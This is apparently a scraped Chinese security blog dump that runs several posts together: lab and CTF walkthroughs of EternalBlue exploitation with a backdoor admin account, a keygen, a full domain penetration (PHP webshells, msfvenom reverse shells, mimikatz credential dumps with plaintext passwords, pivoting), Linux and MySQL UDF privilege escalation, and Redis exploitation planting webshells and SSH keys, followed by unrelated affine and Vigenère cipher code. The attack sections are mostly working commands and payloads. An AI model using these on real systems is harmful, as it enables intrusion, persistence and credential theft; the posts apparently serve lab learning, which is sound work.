就会出来一个链接，点击就到了upload页面。如果我们直接访问upload会报错，因为有如下代码： $referer = $_SERVER[&#x27;HTTP_REFERER&#x27;]; if(isset($referer)!== false) 当我们是通过a标签链接过去的会自动带上refer字段。 第二关 uplaod主要代码： if ((@$_GET[&#x27;filename&#x27;]) &amp;&amp; (@$_GET[&#x27;content&#x27;])) &#123; //$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;); $content = &#x27;HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r&#x27;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); $msg = &#x27;Flag is here,come on~ &#x27; . $savepath . htmlspecialchars($_GET[&#x27;filename&#x27;]) . &quot;&quot;; echo $msg; usleep(100000);//延迟 $content = &quot;Too slow!&quot;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); &#125; 可以发现会我们传入的filename会固定的存储在一个固定的位置，而这个位置会在输出中得到。而文件的内容先是flag然后延迟一下马上替换为了 Too slow! 。其实输入的content并没任何作用。思路：我们一直上传同一个文件名，然后使用python或者pb不断的访问这个文件。如果够快就不会把文本内容替换为 Too slow! 这样我们就可以访问到flag MS17-010漏洞利用演示1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 192.168.164.143 win7 IP 192.168.164.135 使用ping测试即可 使用msf前需要开启postgresql服务 开启服务： service postgresql start 查看服务状态： service postgresql status 开到绿色字体的active即为开启了 初始化数据库： msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口 使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击 输入msfconsole 启动msf 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接 输入命令 set payload windows/x64/meterpreter/reverse_tcp (4).开始运行 输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户 创建一个用户 net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 net localgroup administrtors test /add 目标主机上用户创建成功 实验结束 TraceMe.exe注册机打开程序，随便试一试 通过OD打开该程序，它会自动定位到模块入口点0x004013A0位置，也就是验证函数的内容 数据表中405030的数据，程序中需要用到 汇编代码的如下 00401340 /$ 55 push ebp 00401341 |. 8B6C24 0C mov ebp,dword ptr ss:[esp+0xC] ;ebp = 用户名 00401345 |. 56 push esi ; TraceMe.0040504F 00401346 |. 57 push edi 00401347 |. 8B7C24 18 mov edi,dword ptr ss:[esp+0x18] ;edi = 用户名的长度 0040134B |. B9 03000000 mov ecx,0x3 ;ecx = 从用户名的第四个字符开始计算 00401350 |. 33F6 xor esi,esi ;esi = 0 = 计算出的注册码 ; TraceMe.0040504F 00401352 |. 33C0 xor eax,eax ;eax = 0,用于计数，读取数据表的第eax个字节 00401354 |. 3BF9 cmp edi,ecx ;if(edi &gt; ecx) 00401356 |. 7E 21 jle short ;&#123; TraceMe.00401379 00401358 |. 53 push ebx 00401359 |&gt; 83F8 07 /cmp eax,0x7 ; if(eax &gt; 7) 0040135C |. 7E 02 |jle short TraceMe.00401360 0040135E |. 33C0 |xor eax,eax ;&#123;eax = 0;&#125; 00401360 |&gt; 33D2 |xor edx,edx ;edx = 0; 00401362 |. 33DB |xor ebx,ebx ;ebx = 0 00401364 |. 8A1429 |mov dl,byte ptr ds:[ecx+ebp] ; dl = ebp + ecx = 从用户名的第四个字符开始计算 00401367 |. 8A98 30504000 |mov bl,byte ptr ds:[eax+0x405030] ;bl = 数据表第eax个字符，数据表的内存地址为0x00405030处，查找其数值为0C 0A 13 09 0C 0B 0A 08(根据判断语句0x00401359可知，只有8个数据) 0040136D |. 0FAFD3 |imul edx,ebx ;edx = edx * ebx 00401370 |. 03F2 |add esi,edx ;esi = esi + edx 00401372 |. 41 |inc ecx ;ecx++ 00401373 |. 40 |inc eax ;eax++; 00401374 |. 3BCF |cmp ecx,edi ;if(ecx&lt;edi) 如果未取完用户名字符则继续 00401376 |.^ 7C E1 \\jl short ;&#123;goto 0x00401359&#125; TraceMe.00401359 00401378 |. 5B pop ebx ;计算结束 ; 0012FAE8 00401379 |&gt; 56 push esi ; /&lt;%ld&gt; = 40504F (4214863.) 使用python写出注册机 def crake_traceme(): code, len = 0, 0 username = input(&quot;输入用户名&quot;) num = [0x0C, 0x0A, 0x13, 0x09, 0x0C, 0x0B, 0x0A, 0x08] for i in range(3, len(username)): if len &gt; 7: len = 0 code += ord(username[i]) * num[len] len += 1 print(&quot;The code is:\\n&quot; + str(code)) crake_traceme() ) 一次域渗透测试攻击第一次做渗透测试，有的地方做的不是很好 环境搭建使用的靶机是红日安全提供的，地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 搭建过程中有一点需要注意 Web服务主机win7有两块网卡，需要在设置中再添加一块网卡 网卡一连接到VMnet2中，作为内网环境 网卡二连接到VMnet1中，作为公网环境，并攻击机连到VMnet1中,确保其可以访问网站主页 剩下的两台域控主机直接连接到VMnet2中即可，可以与web服务器通信 修改window10物理机的VMnet1网卡 这样物理机和kali都可以访问到靶机网站 实验拓扑图: web服务器(win7): 公网IP:192.168.74.128 内网IP: 192.168.52.143 主机名:stu1 域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh 域控(Windows Server 2008)：192.168.52.138 主机名：owa web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问 渗透过程网站探测首先访问网站主页: http://192.168.74.129/yxcms 先扫描一下目录 可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如/public,可以看到该目录下的很多内容，但是没有想要内容 网站漏洞利用getshell 经过探测网站的后台登录页面是http://192.168.74.129/yxcms/index.php?r=admin/index/login 经过爆破很容易试出密码为123456 成功登录后台 尝试搜索网站已发现的漏洞 这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞 代码审计| yxcms app 1.4.6 漏洞集合 可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞 访问http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default，这里可以写入php文件 写入一句话木马 写入成功后，访问http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php可以看到已经成功写入一句话木马，之后就是用蚁剑连接 成功获取shell，并且是system权限，这是由于该网站管理员直接使用administrator登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限 使用phpMyAdmin Getshell扫描http://192.168.74.129/ 直接使用工具爆破，很容易得到，用户名和密码都为root 一开始的想法是利用写into outfile写木马getshell，但是由于网站的secure_file_priv的值为NULL，所以我们不能利用写into outfile写木马getshell 但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:mysql日志木马 执行下列命令 set global general_log&#x3D;on; #开启日志 set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;; #设置指定文件为网站日志存放文件 SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; #执行该语句，会将该命令写入日志文件 执行完命令，便可以在网站根目录下看到hack.php 浏览器访问http://192.168.74.129/yxcms/hack.php，一句话木马访问成功 后渗透攻击在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。 执行whoami ,ipconfig,net localgroup administrators命令我们知道当前的用户身份是 administrator ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143 获取MSF shell使用msf生成木马 kali终端输入msfconsole，进入msf 选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口 use windows/x64/meterpreter_reverse_tcp 输入show options查看方法 新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.74.130 lport=4444 -f exe -o 1.exe 再次输入msfconsole 进入应用，输入use exploit/multi/handler进入管理工具，获取shell权限，命令如下 use exploit/multi/handler set payload windows/x64/meterpreter_reverse_tcp set lhost kali&#x27;s ip run 即可获取shell 获取密码在meterpreter中运行run windows/gather/smart_hashdump,但是出现错误，提示需要system进程权限 使用migrate 388将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的 再使用run windows/gather/smart_hashdump 接下来是破解该密码 加载 kiwi模块 load kiwi creds_all 结果如下 meterpreter &gt; creds_all [+] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain LM NTLM SHA1 -------- ------ -- ---- ---- Administrator GOD edea194d76c77d87840ac10a764c7362 8a963371a63944419ec1adf687bb1be5 343f44056ed02360aead5618dd42e4614b5f70cf STU1$ GOD cde51539f42c2854d74e82db1173dd8c 50950d918317edf0ab95661a565c6ebf1151fe3b wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD hongrisec@2019 STU1$ GOD 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b tspkg credentials ================= Username Domain Password -------- ------ -------- Administrator GOD hongrisec@2019 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD.ORG hongrisec@2019 stu1$ GOD.ORG 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b 可以看到密码已经被破解处理 password：hongrisec@2019 远程桌面登录已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。 直接使用administrator登录的话可能被管理员发现，所以使用第二种方法 net user hack password /add net localgroup administrators hack /add 查看主机是否开启3389端口 nmap -p 3389 -v 192.168.74.129 可以发现是关闭的。 使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功) run post/windows/manage/enable_rdp 再次扫描就会发现3389端口已经打开 直接连接即可 添加路由、挂Socks4a代理 添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机 添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务 注：添加路由一定要在挂代理之前，因为代理需要用到路由功能 在获取shell的机器上添加路由 meterpreter &gt; run get_local_subnets meterpreter &gt; run autoroute -s 192.168.21.0/24 # 添加路由 meterpreter &gt; run autoroute -p # 显示路由 meterpreter &gt; route flush # 删除 使用run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24，查看存活的主机 然后建立socks4代理 meterpreter &gt; background msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a msf5 auxiliary(server/socks4a) &gt; set srvhost 127.0.0.1 msf5 auxiliary(server/socks4a) &gt; set srvport 1080 msf5 auxiliary(server/socks4a) &gt; run 设置完代理后攻击者主机就可以访问内网了 域信息收集net time /domain #查看时间服务器 net user /domain #查看域用户 net view /domain #查看有几个域 net group &quot;domain computers&quot; /domain #查看域内所有的主机名 net group &quot;domain admins&quot; /domain #查看域管理员 net group &quot;domain controllers&quot; /domain #查看域控 汇总 从域信息收集可以得到以下信息： 域：god.org 域内有三个用户：administrator、ligang、liukaifeng01 域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1 域控：OWA(192.168.52.138) 域管理员：administrator 由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。 内网主机信息收集远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机 当然之前已经设置完代理了，也可以使用kali中的msf探测 内网存活主机探测因为之前的代理搭建存在问题，导致这一步不能做，就在网上找了一些相关操作 在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：后渗透阶段之基于MSF的内网主机探测 auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机 auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机 auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机 内网存活主机端口扫描使用MSF自带模块进行端口探测 auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(默认扫描1-10000) 也可以用nmap扫描 内网存活主机服务探测auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口 auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口 auxiliary/scanner/telnet/telnet_version #发现内网telnet服务，基于默认23端口 auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口 auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口 auxiliary/scanner/http/title #探测内网http服务的标题 auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口 auxiliary/scanner/mssql/mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口 auxiliary/scanner/oracle/oracle_hashdump #发现内网oracle服务,基于默认的1521端口 auxiliary/scanner/mysql/mysql_version #发现内网mysql服务，基于默认3306端口 auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口 auxiliary/scanner/redis/redis_server #发现内网Redis服务，基于默认6379端口 auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的50000端口 auxiliary/scanner/netbios/nbname #探测内网主机的netbios名字 提权复现通配符提权简介通配符是一个字符或一组字符，可以用来替换某些范围/类别的字符。在执行任何其他操作之前，通配符首先要经过shell进行解释。 下面是一些常见的通配符： * 星号可以与文件名中的任意数量的字符匹配，包括0个字符。 ? 问号用于匹配任意单个字符。 [ ] 括号内包括一组字符，其中任何一个字符都可以匹配该位置上的单个字符。 – []中的连字符表示字符范围。 ~ 单词开头的波浪符表示当前用户的主目录的名称。如果该字符后面是另一个用户的登录名，则表示该用户的主目录。 利用chown的--reference参数提权 –reference=&lt;参考文件或目录&gt;：把指定文件或目录的所有者与所属组，统统设置成和参考文件或目录的所有者与所属组相同。 本地提权实验环境ubuntu18.04 首先创建一个hacker用户 adduser hacker 登录sunzy账号，在home/sunzy/test 随便写一些文件，作为实验参考对象 登录hacker账号，并且在test目录下写两个文件 这里需要实验su命令提升权限，并且将所有者和用户组改为hacker 其中hacker.php与’–reference=hacker.php’中的名字需要一致 使用root权限在/home/sunzy/test/执行 chown -R hacker1:hacker1 *.php 结果如下，发现，属于sunzy用户的文件，现在属于hacker，这样hacker就可以对这些文件进行读写操作。 linux SUID提权关于SUIDSUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。 查找具有 SUID 权限位文件以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。 find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ; 也可以使用 sudo -l 命令列出当前用户可执行的命令 提权nmap nmap（2.02-5.21）存在交换模式，可利用提权 nmap --interactive 之后执行: nmap&gt; !sh sh-3.2# whoami root msf中的模块为： exploit/unix/local/setuid_nmap 较新版可使用 --script 参数： echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse kali nmap 7.7 提权成功： mysql UDF提权UDF提权原理UDF指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用dll文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的root用户的一个权限时，即使所在的系统权限很低，也可以使用UDF来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。 这里使用mysql进行复现。 首先我们需要拥有mysql数据库的root权限，由于mysql的版本不同，udf提权的方式也不同。 mysql版本&gt;5.1 需要在mysql的安装目录下创建 lib\\plugin 这个文件夹（默认不存在），之后将把dll文件放在这个文件夹中；mysql版本&lt;5.1 需要将dll文件放在 C:\\windows\\或C:\\windows\\system32。 然后加载函数，就可以使用了。 注意：提权所用的dll在sqlmap或msf中都有，要与受害机的系统与数据库位数进行匹配。 msf提权演示这里主要演示大于5.1的版本。所以接下来创建目录，关于创建目录，下面的第二篇参考提供了一个使用NTFS ADS流的方式，大家可以进行尝试，这里我直接手工进行创建。 然后我们需要把自定义好的函数，也就是执行系统命令的函数加载进数据库中，我们需要先将定义好的一个dll放入lib\\plugin这个文件夹，这里如果无法上传文件，我们可以创建一个数据表，将dll中的数据十六进制编码，之后在通过读取的方式写入到lib\\plugin\\udf.dll文件中，这样也是可以达到上传文件的效果的。写入文件有一个前提，就是secure_file_priv这个选项需要为空值，这样才可以加载或写入文件。 NULL表示不可以写入修改mysql.ini文件，使其为空值 这样一来就可以写入文件了。 但是这里我们利用msf进行攻击，需要远程连接该主机的数据库，所以要提前查看，该数据库是否可以远程连接。 这里发现root用户的连接对象都是本地，可以使用sql语句进行修改，将其改为允许远程连接 update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;; 这条语句来修改连接对象为所有主机之后尝试使用msf进行攻击。 进入msf，加载exploit/multi/mysql/mysql_udf_payload模块 这里的需要mysql数据库的账号和密码，以及连接的主机。设置完之后，尝试攻击。攻击完之后，在受害机的lib\\plugin目录下将会生成一个dll文件。之后查看已载入的函数并尝试执行。 执行成功返回0。由于该命令没有回显，不方便，所以我们需要手动的加载一个有回显的函数。 这里的dll文件的名称是msf随机的，利用该条命令载入了sys_eval函数 可以看到该条函数成功将执行结果回显出来了。 redis未授权访问漏洞利用漏洞简介Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。 该漏洞的产生条件有以下两点： 1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。 漏洞危害：(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器; 环境搭建在kali中安装redis 3.2.0 创建redis安装目录 mkdir /usr/local/redis cd /usr/local/redis/ wget http://download.redis.io/releases/redis-3.2.0.tar.gz //获取redis压缩包 tar xzf redis-3.2.0.tar.gz cd /usr/local/redis/redis-3.2.0 make #编译安装 安装完成之后需要修改配置文件，配置允许可以远程访问。 vim redis.conf #修改默认配置文件 在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。 然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。 cd src cp redis-cli /usr/bin cp redis-server /usr/bin cp redis.conf /etc/ 开启redis服务 redis-server /etc/redis.conf 第一台作为攻击机即可，然后将这台主机克隆作为目标主机 攻击机 ip:192.168.164.145 目标主机 ip:192.168.164.23 首先确定目标主机是否开启redis服务，使用nmap扫描端口6379 如下，显示了目标使用的redis版本以及服务器的信息 漏洞利用1.写入木马文件首先进入redis安装目录的src中执行 ./redis-cli -h 192.168.164.23 成功控制目标的redis服务 向其网站根目录中写入一句话木马 config set dir /var/www/html config set dbfilename shell.php set x &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; save save成功后，目标主机的网站根目录就出现了木马文件 使用蚁剑连接 2.写ssh-keygen公钥然后使用私钥进行登陆写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。 首先生成公钥密钥文件 ssh-keygen -t rsa cat /root/.ssh/id_rsa.pub 继续使用命令 config set dir /root/.ssh/ config set authorized_keys set x &quot;\\n\\n\\n\\id_rsa.pub的内容\\n\\n\\n&quot; save 使用公钥连接 ssh -i id_rsa root@192.168.164.23 这里的id_rsa与创建ssh密钥输入的内容一致 3.利用计划任务反弹shell只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用 漏洞修复1、限制登录ip在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。 2、添加密码在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。 3、修改默认端口","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"xxe","slug":"xxe","permalink":"https://sunzhengyu99.github.io/tags/xxe/"}]},{"title":"密码学","date":"2020-12-23T08:37:43.000Z","path":"2020/12/23/密码学/","text":"密码学实验课程设计 一、古典密码仿射密码简介仿射加密在本质上还是一个置换密码：如果说移位密码是一个常数级别的置换，那么，仿射加密是一个一次级别的置换 加密原理假设X，Y，A，B是Z26整数环中的元素，A和B为密钥，X是原文，Y是密文 加密函数：Y=（AX+B）%26 解密函数：Y=（AX+B）%26，得到：X=（A的逆元）*（Y-B）%26 原理很简单，代码实现也比较简单 代码实现各个函数作用 gcd(a,b) 求a,b的最大公因子 findModReverse(a,m) 计算a模m的逆元 encode(a,b,s) 仿射加密 decode(a,b,s) 仿射解密 利用扩展的欧几里得算法求逆元 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m 完整代码如下 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def encode(a,b,s): result = &quot;&quot; # 保存加密结果 s = s.upper() # 全部转换为大写，方便计算 for i in range(0,len(s)): s2 = chr((a*(ord(s[i])-65)+b)%26 + 65) #使用加密公式 Y=（AX+B）%26 result = result +s2 print(result.lower()) def decode(a,b,s): a1 = findModReverse(a,26) result = &quot;&quot; s = s.upper() for i in range(0, len(s)): s2 = chr((a1 * (ord(s[i]) - 65 - b)) % 26 + 65) # 使用解密公式X=（A的逆元）*（Y-B）%26 result = result + s2 print(result.lower()) def s_decode(a,b,s): letter =&#x27;abcdefghijklmnopqrstuvwxyz&#x27; letter = letter.upper() s = s.upper() result = &quot;&quot; for i in s: for j in range(0,len(letter)): if i == letter[(a*j+b)%26]: result = result+letter[j] print(result.lower()) def main(): # 主函数入口 answer = input(f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;) try: if answer.upper() == &#x27;E&#x27;: a = int(input(&#x27;请输入a:&#x27;)) b = int(input(&#x27;请输入b:&#x27;)) s = input(&#x27;请输入需要加密的字符:&#x27;) encode(a, b, s) elif answer.upper() == &#x27;D&#x27;: a = int(input(&#x27;请输入a:&#x27;)) b = int(input(&#x27;请输入b:&#x27;)) s = input(&#x27;请输入需要解密的字符：&#x27;) decode(a, b, s) # 利用逆元解密 # s_decode(a,b,s) # 暴力枚举每一个字符 else: print(&#x27;输入错误！&#x27;) except KeyError: print(&#x27;请勿输入空格！&#x27;) if __name__ == &#x27;__main__&#x27;: main() # a = 7, b = 22 # plain = firstthesentenceandthentheevidencesaidthequeen # crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj 加解密结果如图所示 破解仿射密码这里使用了加解密中的 gcd findModReverse，找出26以内且与26互素的所有数的逆元，并存放在一个列表中 def findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all 完整代码如下 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all def decode(s): re_all = findAllre() for k1 in re_all: for k2 in range(0, 26): result = &quot;&quot; for i in range(len(s)): s2 = chr(((int(k1) * (ord(s[i]) - 97 - k2)) % 26 + 97)) result = result + s2 print(&quot;k1=&quot; + str(findModReverse(k1,26)) + &quot;, k2=&quot; + str(k2) + &quot; plaintext = &quot; + result) def main(): # criphertext = &#x27;falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj&#x27; criphertext = input(&quot;请输入要破解的密文: &quot;) criphertext = criphertext.lower() print(&quot;---------&quot;*3+&quot;strat attck&quot;+&quot;---------&quot;*3) decode(criphertext) if __name__ == &#x27;__main__&#x27;: main() 效果如下 维吉尼亚密码1.简介维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。 维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（意大利语：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。 维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。 2.加解密原理 加解密代码 # 将密钥处理成和密文/明文一样长 def solve_key(s,key): nkey = key while len(nkey) &lt; len(s): nkey = nkey+key nkey = nkey[:len(s)] return nkey # 加密函数 def encode(s,key): print(&#x27;加密后的结果： &#x27;,end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0,len(s)): s2 = chr(abs(((ord(s1[i])-65)+(ord(key1[i])-65)) % 26) + 65) result = result + s2 print(result.lower()) # 解密函数 def decode(s,key): print(&#x27;解密后的结果： &#x27;, end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0, len(s)): s2 = chr(((ord(s1[i]) - 65) - (ord(key1[i]) - 65)) % 26 + 65) result = result + s2 print(result.lower()) def main(): while 1: # 函数入口 answer = input(f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;) try: if answer.upper() == 